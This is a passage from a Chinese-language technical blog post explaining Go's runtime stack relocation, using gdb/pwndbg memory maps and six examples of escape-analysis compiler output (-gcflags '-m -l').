hack()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上编译为elf文件后是gdb进行调试</p>
<p>main_mian的地址为0x45DA40</p>
<p>程序刚开始运行时的堆栈就为操作系统所给的堆栈空间</p>
<p> <strong>RSP</strong>  0x7fffffffdf30 ◂— 0x1<br> <strong>RIP</strong>  0x45b9e0 (_rt0_amd64_linux) ◂— jmp   0x458580</p>
<p>下断点到main_main函数</p>
<p> <strong>RBP</strong>  0xc00003e7d0 ◂— 0x0<br> <strong>RSP</strong>  0xc00003e780 —▸ 0x42fb29 (runtime.main+521) ◂— mov   eax, dword ptr [rip + 0xcbbf5]<br> <strong>RIP</strong>  0x45da40 (main.main) ◂— mov   rcx, qword ptr fs:[0xfffffffffffffff8]</p>
<p>可以看到以上,rsp与rbp已经不再是0x7f开头的地址了而是进行了堆栈迁移</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x45e000 r-xp    5e000 0      /home/logan/share/bytectf/leak/leak</span><br><span class="line">          0x45e000           0x4c8000 r--p    6a000 5e000  /home/logan/share/bytectf/leak/leak</span><br><span class="line">          0x4c8000           0x4cc000 rw-p     4000 c8000  /home/logan/share/bytectf/leak/leak</span><br><span class="line">          0x4cc000           0x4fe000 rw-p    32000 0      [heap]</span><br><span class="line">      0xc000000000       0xc004000000 rw-p  4000000 0      </span><br><span class="line">    0x7fffd1328000     0x7fffd3699000 rw-p  2371000 0      </span><br><span class="line">    0x7fffd3699000     0x7fffe3819000 ---p 10180000 0      </span><br><span class="line">    0x7fffe3819000     0x7fffe381a000 rw-p     1000 0      </span><br><span class="line">    0x7fffe381a000     0x7ffff56c9000 ---p 11eaf000 0      </span><br><span class="line">    0x7ffff56c9000     0x7ffff56ca000 rw-p     1000 0      </span><br><span class="line">    0x7ffff56ca000     0x7ffff7a9f000 ---p  23d5000 0      </span><br><span class="line">    0x7ffff7a9f000     0x7ffff7aa0000 rw-p     1000 0      </span><br><span class="line">    0x7ffff7aa0000     0x7ffff7f19000 ---p   479000 0      </span><br><span class="line">    0x7ffff7f19000     0x7ffff7f1a000 rw-p     1000 0      </span><br><span class="line">    0x7ffff7f1a000     0x7ffff7f99000 ---p    7f000 0      </span><br><span class="line">    0x7ffff7f99000     0x7ffff7ff9000 rw-p    60000 0      </span><br><span class="line">    0x7ffff7ff9000     0x7ffff7ffd000 r--p     4000 0      [vvar]</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>

<p>可以发现新的堆栈空间大小为0x4000000, 而操作系统所给的为0x21000, 所以golang的变量大部分都会优先储存在堆栈上，因为堆栈空间比较大，且内存管理比较简单。</p>
<h2 id="go的逃逸分析"><a href="#go的逃逸分析" class="headerlink" title="go的逃逸分析"></a>go的逃逸分析</h2><p>go在动态编译的时候进行逃逸分析，来决定一个对象放栈上还是放堆上，不逃逸的对象放栈上，可能逃逸的放堆上。</p>
<h3 id="开启逃逸分析日志"><a href="#开启逃逸分析日志" class="headerlink" title="开启逃逸分析日志"></a>开启逃逸分析日志</h3><p>在编译的时候参数加上<code>-gcflags &#39;-m&#39;</code>,为了不产生inline函数，一般都会加上<code>-l</code></p>
<p>也就是 <code>-gcflags &#39;-m -l&#39;</code></p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        s := <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">        fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逃逸分析</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(~/share/bytectf/leak)</span><br><span class="line">└&gt; go run -gcflags &#x27;-m -l&#x27; 1.go</span><br><span class="line"># command-line-arguments</span><br><span class="line">./1.go:6:13: ... argument does not escape</span><br><span class="line">./1.go:6:13: s escapes to heap</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>



<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x S</span><br><span class="line">    y := &amp;x</span><br><span class="line">    _ = *identity(y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">identity</span><span class="params">(z *S)</span> *<span class="title">S</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(~/share/bytectf/leak)</span><br><span class="line">└&gt; go run -gcflags &#x27;-m -l&#x27; 2.go</span><br><span class="line"># command-line-arguments</span><br><span class="line">./2.go:11:15: leaking param: z to result ~r1 level=0</span><br></pre></td></tr></table></figure>

<p>x没有被引用，没有发生逃逸</p>
<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x S</span><br><span class="line">    _ = *ref(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ref</span><span class="params">(z S)</span> *<span class="title">S</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(~/share/bytectf/leak)</span><br><span class="line">└&gt; go run -gcflags &#x27;-m -l&#x27; 3.go             </span><br><span class="line"># command-line-arguments</span><br><span class="line">./3.go:10:10: moved to heap: z</span><br></pre></td></tr></table></figure>

<p>go进行值传递，而在调用ref后进行引用，避免内存错误，则会将z放在heap上。</p>
<h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123; </span><br><span class="line">    M *<span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">int</span> </span><br><span class="line">    refStruct(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">refStruct</span><span class="params">(y <span class="keyword">int</span>)</span> <span class="params">(z S)</span></span> &#123;</span><br><span class="line">    z.M = &amp;y</span><br><span class="line">    <span class="keyword">return</span> z </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(~/share/bytectf/leak)</span><br><span class="line">└&gt; go run -gcflags &#x27;-m -l&#x27; 4.go</span><br><span class="line"># command-line-arguments</span><br><span class="line">./4.go:12:16: moved to heap: y</span><br></pre></td></tr></table></figure>

<p>对y进行了值引用，则使y放在heap上</p>
<h3 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123; </span><br><span class="line">    M *<span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">int</span> </span><br><span class="line">    refStruct(&amp;i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">refStruct</span><span class="params">(y *<span class="keyword">int</span>)</span> <span class="params">(z S)</span></span> &#123;</span><br><span class="line">    z.M = y</span><br><span class="line">    <span class="keyword">return</span> z </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(~/share/bytectf/leak)</span><br><span class="line">└&gt; go run -gcflags &#x27;-m -l&#x27; 5.go</span><br><span class="line"># command-line-arguments</span><br><span class="line">./5.go:12:16: leaking param: y to result z level=0</span><br></pre></td></tr></table></figure>

<p>对原先堆栈里的数据进行引用，没有发生逃逸</p>
<h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123; </span><br><span class="line">    M *<span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">    <span class="keyword">var</span> x S</span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">int</span></span><br><span class="line">    ref(&amp;i, &amp;x) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ref</span><span class="params">(y *<span class="keyword">int</span>, z *S)</span></span> &#123; </span><br><span class="line">    z.M = y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(~/share/bytectf/leak)</span><br><span class="line">└&gt; go run -gcflags &#x27;-m -l&#x27; 6.go</span><br><span class="line"># command-line-arguments</span><br><span class="line">./6.go:13:10: leaking param: y</span><br><span class="line">./6.go:13:18: z does not escape</span><br><span class="line">./6.go:9:9: moved to heap: i</span><br></pre></td></tr></table></figure>

<p>z没有逃逸，有两个指针指向i变量，而i逃逸了，go的逃逸分析不知道z和i的关系，逃逸分析不知道参数y是z的一个成员，所以只能把i分配给堆管理</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是golang编译器通过分析代码会在编译时觉得哪些变量该分配在stack中，哪些变量该分配在heap中。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/25/golang-escape-analysis/" data-id="ckhemv7zq0009wdcm54iea16o" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/" rel="tag">golang</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>